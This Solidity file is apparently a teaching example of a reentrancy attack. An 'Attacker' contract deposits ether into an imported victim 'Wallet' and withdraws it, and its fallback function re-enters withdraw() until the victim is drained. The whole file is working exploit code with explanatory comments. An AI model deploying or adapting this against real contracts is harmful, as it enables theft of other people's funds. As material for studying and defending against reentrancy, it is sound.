//SPDX-License-Identifier: MTI

pragma solidity >=0.6.10;

/// @title Reentrancy Example
/// @author Tommy Atkins
/// @notice Simple an example in relation to Smart Contract Security - Sourced from Ethernaut / DAO Wallet / Mark Muskardin @Smart Contract Security

/// @notice Importing the 'Victim Smart Contract'
import "./Wallet.sol";

contract Attacker {
    /// @notice A public state instance variable. This will hold the address of the Victim Smart Contract
    Wallet public wallet;

    /// @notice The constructor is run only once during deployment
    /// @param _walletAddress is the Victim Smart Contract address
    constructor(address _walletAddress) public {
        /// @dev NOT including the 'new' keyword before Wallet will create a pointer to the smart contract
        wallet = Wallet(_walletAddress);
    }

    /// @notice Function attack is external and payable meaning anyone call interact and send money to it
    function attack() external payable {
        /// @notice Requires the ether value to be equal to or greater than 1
        require(msg.value >= 1 ether);

        /// @notice Call the deopsit function of the Victim Smart Contract wallet and immediately withdraw it
        /// notice Because we immediately withdraw the ether, the withdraw function inside of Wallet.sol will execute our Fallback function.
        wallet.deposit{value: msg.value}();
        wallet.withdraw(1 ether);
    }

    /// @notice As soon as Wallet.sol executes the withdraw funtion, Attacker.sol will execute this fallback funtion.
    /// @notice This fallback function will execute withdraw on Wallet.sol and create a loop until the below requirement of >= 1 ether is no longer met.
    fallback() external payable {
        if (address(wallet).balance >= 1 ether) {
            wallet.withdraw(1 ether);
        }
    }

    /// @notice Simple function to show this contracts balance.
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
